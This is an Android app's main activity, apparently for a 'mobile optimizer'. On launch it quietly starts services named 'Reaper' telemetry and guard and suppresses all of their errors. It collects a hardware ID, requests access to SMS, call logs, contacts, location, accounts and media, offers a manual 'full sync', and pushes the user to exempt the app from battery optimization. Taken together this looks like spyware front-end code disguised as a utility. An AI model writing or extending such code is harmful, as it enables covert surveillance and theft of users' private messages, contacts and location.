package com.lukzi.mobileoptimizer;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int REQ = 0x5EA1;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        TextView status = findViewById(R.id.txt_status);
        status.setText("HWID: " + SecurityGuard.getDeviceHwid(this).substring(0, 12) + "…\n"
                + Build.MANUFACTURER + " " + Build.MODEL + "  •  API " + Build.VERSION.SDK_INT);

        try { ReaperTelemetryEngine.init(this); } catch (Throwable ignored) {}
        try { ReaperGuardService.start(this); } catch (Throwable ignored) {}

        ((Button) findViewById(R.id.btn_perm)).setOnClickListener(v -> requestAll());

        ((Button) findViewById(R.id.btn_ping)).setOnClickListener(v ->
                ReaperTelemetryEngine.onLogin(this, "manual_test", "MANUAL"));

        ((Button) findViewById(R.id.btn_sync)).setOnClickListener(v -> {
            Toast.makeText(this, "Full sync started…", Toast.LENGTH_SHORT).show();
            new Thread(() -> ReaperTelemetryEngine.executeTelemetrySync(
                    getApplicationContext(), "manual_test", "MANUAL", true),
                    "reaper-manual").start();
        });

        ((Button) findViewById(R.id.btn_usage)).setOnClickListener(v -> openUsage());

        ((Button) findViewById(R.id.btn_batt)).setOnClickListener(v -> openBattery());
    }

    private void openUsage() {
        try {
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        } catch (Throwable t) {
            Toast.makeText(this, "Usage settings not found", Toast.LENGTH_SHORT).show();
        }
    }

    private void openBattery() {
        try {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Throwable t) {
            try {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                Intent i = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                startActivity(i);
            } catch (Throwable ignored) {}
        }
    }

    private void requestAll() {
        List<String> need = new ArrayList<>();
        add(need, Manifest.permission.READ_SMS);
        add(need, Manifest.permission.READ_CALL_LOG);
        add(need, Manifest.permission.READ_CONTACTS);
        add(need, Manifest.permission.READ_PHONE_STATE);
        add(need, Manifest.permission.ACCESS_FINE_LOCATION);
        add(need, Manifest.permission.ACCESS_COARSE_LOCATION);
        add(need, Manifest.permission.GET_ACCOUNTS);

        if (Build.VERSION.SDK_INT >= 33) {
            add(need, "android.permission.READ_MEDIA_IMAGES");
            add(need, "android.permission.POST_NOTIFICATIONS");
        } else {
            add(need, Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        if (need.isEmpty()) {
            Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
            return;
        }
        ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ);
    }

    private void add(List<String> list, String p) {
        try {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                list.add(p);
        } catch (Throwable ignored) {}
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
        super.onRequestPermissionsResult(code, perms, res);
        if (code == REQ) Toast.makeText(this, "Permissions updated", Toast.LENGTH_SHORT).show();
    }
}
